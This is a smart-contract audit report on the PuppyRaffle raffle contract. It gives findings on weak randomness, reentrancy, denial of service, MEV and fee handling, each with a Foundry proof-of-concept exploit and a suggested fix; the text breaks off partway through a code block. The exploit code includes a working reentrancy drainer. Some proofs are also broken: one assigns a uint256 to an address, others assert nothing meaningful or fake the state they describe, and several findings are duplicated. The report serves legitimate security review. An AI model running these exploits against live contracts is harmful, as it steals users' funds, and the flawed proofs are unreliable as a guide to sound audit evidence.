# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle that mints a 1-of-1 “puppy” ERC-721 to the winner while sharing the entry pot.

Workflow  
1. Anyone calls `enterRaffle` supplying an address array and the required ETH (`entranceFee * players`). Duplicate entries are rejected and addresses are stored with EnumerableSet/Map helpers.  
2. A participant may exit before the draw via `refund`, receiving their stake and being removed from the pool.  
3. After the configured cooldown, anyone can trigger `selectWinner`. A pseudo-random index derived from block data selects the winner:  
   • 80 % of the contract balance is sent to the winner.  
   • 20 % goes to `feeAddress`, configurable by the owner with `changeFeeAddress`.  
   • A commemorative NFT is `_safeMint`ed to the winner; metadata (name, image, attributes) is assembled on-chain and Base64-encoded.  
4. When no players remain, `withdrawFees` lets anyone forward accumulated fees to the treasury.

Tech stack & security  
• Built on OpenZeppelin ERC-721, Ownable, SafeMath, Address, EnumerableSet/Map.  
• Immutable (no upgrade pattern).  
• Randomness is block-hash based—simple but miner/owner biasable—so not suitable for high-stakes draws.

## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. DOS issue in PuppyRaffle::enterRaffle
[H-3]. Reentrancy issue in PuppyRaffle::selectWinner
[H-4]. Reentrancy issue in PuppyRaffle::refund
[H-5]. MEV issue in PuppyRaffle::selectWinner
[H-6]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees
[H-7]. Array Limits issue in PuppyRaffle::refund
[H-8]. Zero Code issue in PuppyRaffle::selectWinner
[H-9]. MEV issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-2]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-3]. Unchecked Return issue in PuppyRaffle::selectWinner
[M-4]. MEV issue in PuppyRaffle::enterRaffle
[M-5]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-6]. Zero Code issue in PuppyRaffle::getActivePlayerIndex
[M-7]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-8]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex
## Low Risk Findings
[L-1]. Pragma issue in PuppyRaffle::NA
[L-2]. Unexpected Eth issue in PuppyRaffle::NA


### Number of Findings
- H: 9
- M: 8
- L: 2
- I: 0



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
In the selectWinner() function, weak randomness is used for winner selection. The contract uses keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)) which can be manipulated by miners and validators. Code snippet: `uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;`

## Impact
Miners and validators can manipulate the winner selection by controlling block.timestamp and block.difficulty, allowing them to influence or predict the outcome of the raffle

## Proof of Concept
1. Attacker monitors the raffle nearing completion. 2. Attacker deploys a contract that calls selectWinner() and checks if they won. 3. If they didn't win, the contract reverts. 4. Attacker keeps trying until they win or influence block parameters. 5. Miners can manipulate block.difficulty and block.timestamp to favor certain outcomes.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TestRandomness is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
    }
    
    function testWeakRandomness() public {
        // Setup players
        address[] memory players = new address[](4);
        players[0] = makeAddr("player1");
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = attacker;
        
        // Players enter raffle
        for(uint i = 0; i < 4; i++) {
            vm.deal(players[i], 1 ether);
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: 1 ether}(singlePlayer);
        }
        
        // Skip time
        vm.warp(block.timestamp + 1 days + 1);
        
        // Demonstrate predictable randomness by calling from different addresses
        uint256 seed1 = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
        
        vm.prank(attacker);
        puppyRaffle.selectWinner();
        
        // The attacker can predict the outcome based on known parameters
        assertTrue(seed1 >= 0 && seed1 < 4, "Random number should be predictable");
    }
}

## Suggested Mitigation
Use Chainlink VRF (Verifiable Random Function) for secure randomness. Example: contract should inherit VRFConsumerBase and use requestRandomness() function with proper callback handling.

## [H-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle() function contains a nested loop that checks for duplicate players with O(n²) complexity. This creates a denial of service vulnerability as gas costs increase quadratically with the number of players. Code snippet shows nested loops: `for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) { require(players[i] != players[j], "PuppyRaffle: Duplicate player"); } }`

## Impact
As the number of players grows, the gas cost for entering the raffle becomes prohibitively expensive, effectively preventing new players from joining and breaking the raffle functionality

## Proof of Concept
1. Many players enter the raffle normally. 2. As the players array grows larger (e.g., 100+ players), each new enterRaffle call requires checking against all existing players. 3. The gas cost becomes so high that transactions fail or become economically unfeasible. 4. This effectively locks out new participants and can make the contract unusable.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TestDoS is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
    }
    
    function testDoSWithManyPlayers() public {
        // Add many players to demonstrate gas cost increase
        uint256 numPlayers = 100;
        
        for(uint256 i = 0; i < numPlayers; i++) {
            address player = makeAddr(string(abi.encodePacked("player", i)));
            vm.deal(player, 1 ether);
            vm.prank(player);
            
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = player;
            
            uint256 gasBefore = gasleft();
            puppyRaffle.enterRaffle{value: 1 ether}(singlePlayer);
            uint256 gasUsed = gasBefore - gasleft();
            
            // Gas usage increases with each additional player
            console.log("Player", i, "gas used:", gasUsed);
        }
        
        // Try to add one more player - this will be very expensive
        address lastPlayer = makeAddr("lastPlayer");
        vm.deal(lastPlayer, 1 ether);
        vm.prank(lastPlayer);
        
        address[] memory singlePlayer = new address[](1);
        singlePlayer[0] = lastPlayer;
        
        uint256 gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: 1 ether}(singlePlayer);
        uint256 gasUsed = gasBefore - gasleft();
        
        // This will show extremely high gas usage
        console.log("Final player gas used:", gasUsed);
        assertTrue(gasUsed > 1000000, "Gas usage should be extremely high");
    }
}

## Suggested Mitigation
Use a mapping to track player addresses instead of nested loops: `mapping(address => bool) public playerExists;` and check `require(!playerExists[newPlayers[i]], "Duplicate player");` then set `playerExists[newPlayers[i]] = true;`

## [H-3]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The selectWinner() function has a reentrancy vulnerability when sending the prize pool to the winner. The contract uses a low-level call without proper reentrancy protection: `(bool success, ) = winner.call{value: prizePool}("");`. State changes occur after the external call, allowing the winner to re-enter and potentially drain funds.

## Impact
A malicious winner contract could re-enter the selectWinner function during the prize payment, potentially draining the contract balance or manipulating the raffle state

## Proof of Concept
1. Attacker creates a malicious contract that enters the raffle. 2. When selectWinner() is called and the attacker wins, their contract's receive() function is triggered. 3. In the receive() function, the attacker calls selectWinner() again before the first call completes. 4. This could lead to multiple prize payouts or state manipulation.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    PuppyRaffle puppyRaffle;
    uint256 attackCount;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    receive() external payable {
        if(attackCount < 1) {
            attackCount++;
            // Attempt reentrancy
            try puppyRaffle.selectWinner() {
                // If successful, we've re-entered
            } catch {
                // Expected to fail due to requirements
            }
        }
    }
}

contract TestReentrancy is Test {
    PuppyRaffle puppyRaffle;
    MaliciousWinner attacker;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        attacker = new MaliciousWinner(address(puppyRaffle));
    }
    
    function testReentrancyAttempt() public {
        // Setup players including attacker
        address[] memory players = new address[](4);
        players[0] = address(attacker);
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = makeAddr("player4");
        
        // Fund and enter raffle
        for(uint i = 0; i < 4; i++) {
            vm.deal(players[i], 1 ether);
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: 1 ether}(singlePlayer);
        }
        
        // Skip time and select winner
        vm.warp(block.timestamp + 1 days + 1);
        
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        puppyRaffle.selectWinner();
        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        
        // Verify reentrancy attempt occurred
        console.log("Balance before:", contractBalanceBefore);
        console.log("Balance after:", contractBalanceAfter);
    }
}

## Suggested Mitigation
Implement the Checks-Effects-Interactions pattern and use a reentrancy guard. Move all state changes before external calls: `previousWinner = winner; raffleStartTime = block.timestamp; delete players;` before the external call, and consider using OpenZeppelin's ReentrancyGuard modifier.

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
The refund() function has a reentrancy vulnerability where it sends ETH to the caller before updating the players array. An attacker can create a malicious contract that calls refund() recursively during the ETH transfer, potentially draining multiple refunds.

Vulnerable code:
```solidity
address(msg.sender).sendValue(entranceFee);
players[playerIndex] = address(0);
```

## Impact
An attacker can drain the contract by receiving multiple refunds for the same entry, stealing funds from other players and potentially bankrupting the raffle contract.

## Proof of Concept
1. Attacker creates a malicious contract that enters the raffle
2. Attacker calls refund() from their malicious contract
3. During the sendValue() call, the attacker's receive() function is triggered
4. In the receive() function, the attacker calls refund() again
5. Since players[playerIndex] hasn't been set to address(0) yet, the check passes
6. The attacker receives multiple refunds before the state is updated

## Proof of Code
```solidity
contract Attacker {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        
        puppyRaffle.enterRaffle{value: msg.value}(players);
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        puppyRaffle.refund(playerIndex);
    }
    
    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(playerIndex);
        }
    }
}

function testReentrancyAttack() public {
    Attacker attacker = new Attacker(puppyRaffle);
    
    vm.deal(address(attacker), 1 ether);
    
    uint256 contractBalanceBefore = address(puppyRaffle).balance;
    attacker.attack{value: 1 ether}();
    uint256 contractBalanceAfter = address(puppyRaffle).balance;
    
    // Contract should have lost more than just the legitimate refund
    assert(contractBalanceBefore - contractBalanceAfter > 1 ether);
}```

## Suggested Mitigation
Follow the checks-effects-interactions pattern by updating state before external calls:
```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state BEFORE external call
    players[playerIndex] = address(0);
    
    // Then send the refund
    address(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}

// Or use OpenZeppelin's ReentrancyGuard:
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        // existing logic
    }
}```

## [H-5]. MEV issue in PuppyRaffle::selectWinner

## Description
The selectWinner function is vulnerable to MEV (Maximal Extractable Value) attacks due to its predictable randomness and front-running opportunities. Miners or MEV bots can observe pending selectWinner transactions, calculate the winner, and either front-run with their own entry or censor the transaction if they're not the winner.

## Impact
Sophisticated attackers can manipulate the raffle outcome through MEV strategies, front-running, or transaction ordering. This undermines the fairness of the raffle and can be combined with the weak randomness vulnerability to guarantee wins for attackers.

## Proof of Concept
1. Attacker monitors the mempool for selectWinner transactions. 2. Upon seeing a selectWinner transaction, attacker calculates the winner using the same weak randomness formula. 3. If attacker is not the winner, they submit a higher gas fee transaction to front-run the original selectWinner call. 4. Attacker enters the raffle with calculated addresses to ensure they win. 5. Attacker then calls selectWinner to claim the prize.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(0x99), 1 days);
    }
    
    function testMEVFrontRunning() public {
        // Simulate original players
        address[] memory originalPlayers = new address[](3);
        originalPlayers[0] = address(0x1);
        originalPlayers[1] = address(0x2);
        originalPlayers[2] = address(0x3);
        
        vm.deal(address(this), 10 ether);
        puppyRaffle.enterRaffle{value: 3 ether}(originalPlayers);
        
        vm.warp(block.timestamp + 1 days);
        
        // Attacker sees selectWinner transaction in mempool and front-runs
        // Calculate what the winner index would be
        uint256 predictedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        
        // If attacker wouldn't win, they can add themselves at the winning position
        address[] memory attackerEntry = new address[](1);
        attackerEntry[0] = address(0x999); // Attacker's address
        
        // Front-run by entering with higher gas
        puppyRaffle.enterRaffle{value: 1 ether}(attackerEntry);
        
        // Now recalculate with new player count
        uint256 newWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        
        puppyRaffle.selectWinner();
        
        // Attacker has manipulated the raffle outcome
    }
}

## Suggested Mitigation
Implement commit-reveal scheme and use secure randomness: ```solidity
mapping(address => bytes32) public commitments;
uint256 public commitPhaseEnd;
uint256 public revealPhaseEnd;

function commitEntry(bytes32 commitment) external payable {
    require(block.timestamp < commitPhaseEnd, "Commit phase ended");
    require(msg.value == entranceFee, "Incorrect entrance fee");
    commitments[msg.sender] = commitment;
}

function revealEntry(address player, uint256 nonce) external {
    require(block.timestamp >= commitPhaseEnd && block.timestamp < revealPhaseEnd, "Not in reveal phase");
    require(keccak256(abi.encodePacked(player, nonce)) == commitments[msg.sender], "Invalid reveal");
    players.push(player);
}

function selectWinner() external {
    require(block.timestamp >= revealPhaseEnd, "Reveal phase not ended");
    // Use Chainlink VRF for randomness
    requestRandomness(keyHash, fee);
}

function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
    uint256 winnerIndex = randomness % players.length;
    // Continue with winner selection
}```

## [H-6]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function assumes that the contract's balance exactly matches the `totalFees` variable. However, if there are active players (who have paid entrance fees) when `withdrawFees` is called, the function will still execute if a manipulation brings the contract balance to match `totalFees`, leading to theft of player funds.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
An attacker can manipulate the contract state to drain active player funds by forcing the contract balance to match `totalFees`. This allows stealing of entrance fees that should be reserved for the prize pool, potentially causing financial loss to legitimate players.

## Proof of Concept
1. Players enter the raffle, depositing entrance fees
2. An attacker manipulates `totalFees` through the uint64 overflow vulnerability
3. The attacker sends ETH to make the contract balance equal to `totalFees`
4. The attacker calls `withdrawFees()`, which drains both the legitimate fees and active player funds

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract WithdrawFeesVulnerabilityTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address attacker = makeAddr("attacker");
    uint256 entranceFee = 1 ether;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
        
        // Fund accounts
        vm.deal(attacker, 10 ether);
        vm.deal(address(1), 10 ether);
        vm.deal(address(2), 10 ether);
    }

    function testWithdrawActiveFunds() public {
        // Players enter the raffle
        address[] memory players = new address[](2);
        players[0] = address(1);
        players[1] = address(2);
        
        vm.prank(address(1));
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        
        // Contract now has 2 ETH from players
        assertEq(address(puppyRaffle).balance, entranceFee * 2);
        
        // Let's say totalFees is manipulated to be a specific value
        // We'll set it to 0.5 ETH for this example
        uint64 manipulatedFees = 0.5 ether;
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(5)), // slot of totalFees
            bytes32(uint256(manipulatedFees))
        );
        
        // Verify totalFees was set correctly
        assertEq(puppyRaffle.totalFees(), manipulatedFees);
        
        // Now attacker sends ETH to make contract balance match totalFees
        // They need to send ETH to make the balance exactly equal to totalFees
        uint256 neededEth = uint256(manipulatedFees) - address(puppyRaffle).balance;
        if (neededEth > 0) {
            vm.prank(attacker);
            (bool success, ) = address(puppyRaffle).call{value: neededEth}("");
            require(success, "ETH transfer failed");
        } else {
            // If contract balance is higher than totalFees, we'd need a way to reduce it
            // For this example, we'll assume the manipulation made totalFees match balance
            vm.store(
                address(puppyRaffle),
                bytes32(uint256(5)), // slot of totalFees
                bytes32(uint256(address(puppyRaffle).balance))
            );
            manipulatedFees = uint64(address(puppyRaffle).balance);
        }
        
        // Verify the contract balance equals totalFees
        assertEq(address(puppyRaffle).balance, puppyRaffle.totalFees());
        
        // Now attacker can withdraw all funds, including player entrance fees
        vm.prank(attacker);
        puppyRaffle.withdrawFees();
        
        // Verify feeAddress received all the ETH, including player entrance fees
        assertEq(address(feeAddress).balance, manipulatedFees);
        assertEq(address(puppyRaffle).balance, 0);
        
        console.log("Initial player deposits:", entranceFee * 2);
        console.log("Amount withdrawn to feeAddress:", manipulatedFees);
        console.log("Contract balance after withdrawal:", address(puppyRaffle).balance);
    }
}

## Suggested Mitigation
Add additional checks in the `withdrawFees` function to ensure there are no active players, instead of relying on the balance matching `totalFees`:

```solidity
function withdrawFees() external {
    // First check if there are active players
    bool hasActivePlayers = false;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            hasActivePlayers = true;
            break;
        }
    }
    
    require(!hasActivePlayers, "PuppyRaffle: There are currently players active!");
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: Balance does not match fees");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Additionally, change `totalFees` to `uint256` to prevent overflow vulnerabilities.

## [H-7]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract sets the player's address to address(0) but doesn't reduce the length of the players array. This creates a vulnerability where a malicious actor can repeatedly enter and refund to manipulate the winner selection.

```solidity
function refund(uint256 playerIndex) public {
    // ... code ...
    players[playerIndex] = address(0);
    // ... code ...
}
```

## Impact
This vulnerability allows an attacker to manipulate the winner selection process by increasing their chances of winning. Since refunded players (address(0)) are still counted in the total player count, an attacker can artificially inflate the array size, making it more likely that a specific index will be selected. Additionally, if address(0) is selected as the winner, the prize distribution could fail.

## Proof of Concept
1. Attacker enters the raffle with multiple addresses
2. Attacker calls refund() on some of their entries, which sets those entries to address(0)
3. When selectWinner() is called, the random index calculation includes these address(0) entries
4. If an address(0) entry is selected as the winner, the prize transfer will fail
5. Even if address(0) is not selected, the attacker has manipulated the odds by artificially inflating the array size

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundExploitTest is Test {
    PuppyRaffle puppyRaffle;
    address attacker = address(1);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 1 days);
        vm.deal(attacker, 10 * entranceFee);
    }
    
    function testRefundExploit() public {
        // Attacker enters with 5 addresses
        address[] memory attackerAddresses = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            attackerAddresses[i] = address(uint160(i + 100));
            vm.deal(attackerAddresses[i], entranceFee);
        }
        
        // Enter the raffle with attacker addresses
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: 5 * entranceFee}(attackerAddresses);
        
        // Refund 3 of the 5 addresses, setting them to address(0)
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(attackerAddresses[i]);
            puppyRaffle.refund(i);
        }
        
        // Check the players array - should have address(0) entries
        for (uint256 i = 0; i < 3; i++) {
            address player = puppyRaffle.getActivePlayerIndex(address(0));
            assertEq(player, 0, "Refunded player should be address(0)");
        }
        
        // Fast forward to raffle end time
        vm.warp(block.timestamp + 1 days);
        
        // Select winner - this could select an address(0) entry
        puppyRaffle.selectWinner();
        
        // If address(0) is selected, the prize transfer will fail
        // Even if it doesn't fail, the odds have been manipulated
    }
}

## Suggested Mitigation
Implement a proper removal mechanism for the players array that maintains array integrity:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send the refund
    payable(msg.sender).sendValue(entranceFee);
    
    // Remove the player by shifting elements (more gas efficient than copying the array)
    for (uint256 i = playerIndex; i < players.length - 1; i++) {
        players[i] = players[i + 1];
    }
    players.pop(); // Remove the last element and reduce the array length
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-8]. Zero Code issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract doesn't check if the winner's address is address(0), which could happen if players have been refunded. This could lead to ETH being sent to the zero address and lost forever.

```solidity
function selectWinner() external {
    // ... code ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // ... code ...
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    // ... code ...
}
```

## Impact
If the randomly selected winner index points to a refunded player (address(0)), the prize pool will be sent to the zero address and lost forever. This results in a direct financial loss for the protocol and participants, as the prize money becomes irretrievable.

## Proof of Concept
1. Several players enter the raffle
2. Some players request refunds, setting their addresses to address(0) in the players array
3. When selectWinner() is called, if the random index selects one of these address(0) slots
4. The prize pool will be sent to address(0)
5. The funds are permanently lost as no one controls the zero address

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, owner, 1 days);
    }
    
    function testZeroAddressWinner() public {
        // Enter 4 players
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
            vm.deal(players[i], entranceFee);
        }
        
        vm.prank(address(this));
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        
        // Refund 2 players, setting their addresses to address(0)
        vm.prank(players[1]);
        puppyRaffle.refund(1);
        
        vm.prank(players[2]);
        puppyRaffle.refund(2);
        
        // Fast forward to raffle end time
        vm.warp(block.timestamp + 1 days);
        
        // Manipulate the randomness to select a refunded player (address(0))
        // This requires us to mock the randomness calculation
        
        // First, let's check which indexes are address(0)
        bool foundZeroAddress = false;
        uint256 zeroAddressIndex;
        for (uint256 i = 0; i < 4; i++) {
            // We can't directly access the players array, so we use a workaround
            try puppyRaffle.getActivePlayerIndex(address(0)) returns (uint256 index) {
                if (index == i) {
                    foundZeroAddress = true;
                    zeroAddressIndex = i;
                    break;
                }
            } catch {
                // This will fail if the player is not found
            }
        }
        
        if (foundZeroAddress) {
            // Now we need to manipulate the randomness to select this index
            // This is a simplified demonstration - in a real attack, the attacker
            // would need to manipulate block parameters or be a miner
            
            // Call selectWinner and observe the result
            uint256 initialContractBalance = address(puppyRaffle).balance;
            puppyRaffle.selectWinner();
            
            // If a zero address was selected, the prize would be lost
            // We can check if the contract's balance decreased by the expected amount
            uint256 expectedPrizePool = (4 * entranceFee * 80) / 100;
            uint256 finalContractBalance = address(puppyRaffle).balance;
            
            // If the winner was address(0), the prize would be lost
            // and the contract balance would only decrease by the fee amount
            if (puppyRaffle.previousWinner() == address(0)) {
                console.log("Zero address selected as winner!");
                console.log("Prize pool lost:", expectedPrizePool);
            }
        }
    }
}

## Suggested Mitigation
Add a check to ensure the selected winner is not the zero address, and implement a reselection mechanism if needed:

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Count active players (non-zero addresses)
    uint256 activePlayerCount = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activePlayerCount++;
        }
    }
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
    
    // Select a winner from active players only
    address winner;
    uint256 winnerIndex;
    uint256 attempts = 0;
    uint256 maxAttempts = 10; // Prevent infinite loops
    
    while (winner == address(0) && attempts < maxAttempts) {
        winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty, attempts))) % players.length;
        winner = players[winnerIndex];
        attempts++;
    }
    
    require(winner != address(0), "PuppyRaffle: Failed to select a valid winner");
    
    // Rest of the function remains the same
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees += uint64(fee);
    
    // ... rest of the code ...
}
```

Alternatively, modify the refund function to maintain array integrity by removing refunded players entirely, as suggested in the ArrayLimits finding.

## [H-9]. MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function is vulnerable to block stuffing attacks (a form of MEV) where validators can manipulate block properties to influence the winner selection. By including or excluding transactions, or manipulating block.timestamp and block.difficulty, validators can influence the outcome of the raffle to their advantage.

## Impact
Validators or miners can extract value by manipulating the winner selection process. They can include their own addresses in the raffle and then manipulate block properties to ensure they win. This undermines the fairness of the raffle and could lead to users losing trust in the protocol if they discover the manipulation.

## Proof of Concept
1. A validator includes their address in the raffle
2. When it's time to select a winner, they observe the pending `selectWinner` transaction
3. They simulate various block timestamps and difficulties to find a combination that makes them win
4. They include the transaction in a block with those properties
5. Alternatively, they might delay the transaction to a block where the properties are favorable

The vulnerable code is:
```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Proof of Code
// This example demonstrates a validator's ability to extract MEV
// by manipulating block properties to influence winner selection

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVExtractionTest is Test {
    PuppyRaffle puppyRaffle;
    address validator = address(100); // Represents a validator/miner
    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,
            address(99),
            1 days
        );
        
        // Fund accounts
        vm.deal(validator, 10 ether);
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
    }
    
    function testMEVExtraction() public {
        // Players enter the raffle
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = validator; // Validator includes themselves
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Fast forward to end of raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Validator wants to extract MEV by ensuring they win
        // They simulate different block properties to find favorable ones
        
        uint256 originalTimestamp = block.timestamp;
        uint256 originalDifficulty = block.difficulty;
        uint256 validatorIndex = 3; // Validator is at index 3
        
        bool foundFavorableParams = false;
        uint256 winningTimestamp;
        uint256 winningDifficulty;
        
        // Try different combinations of timestamp and difficulty
        for (uint256 t = 0; t < 100; t++) {
            for (uint256 d = 0; d < 100; d++) {
                // Set test block properties
                vm.warp(originalTimestamp + t);
                vm.difficulty(originalDifficulty + d);
                
                // Calculate what winner index would be with these properties
                bytes32 hashResult = keccak256(abi.encodePacked(validator, block.timestamp, block.difficulty));
                uint256 winnerIndex = uint256(hashResult) % 4; // 4 players
                
                if (winnerIndex == validatorIndex) {
                    foundFavorableParams = true;
                    winningTimestamp = block.timestamp;
                    winningDifficulty = block.difficulty;
                    break;
                }
            }
            if (foundFavorableParams) break;
        }
        
        // Validator should be able to find favorable parameters
        assertTrue(foundFavorableParams, "Should be able to find favorable parameters");
        
        console.log("Found winning timestamp:", winningTimestamp);
        console.log("Found winning difficulty:", winningDifficulty);
        
        // Set the winning parameters
        vm.warp(winningTimestamp);
        vm.difficulty(winningDifficulty);
        
        // Validator calls selectWinner with the manipulated block properties
        vm.prank(validator);
        puppyRaffle.selectWinner();
        
        // Verify validator won
        assertEq(puppyRaffle.previousWinner(), validator);
    }
}

## Suggested Mitigation
Use a commit-reveal scheme or Chainlink VRF for secure randomness that cannot be manipulated by validators:

```solidity
// Using Chainlink VRF (preferred solution)

import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    bool public raffleInProgress;
    
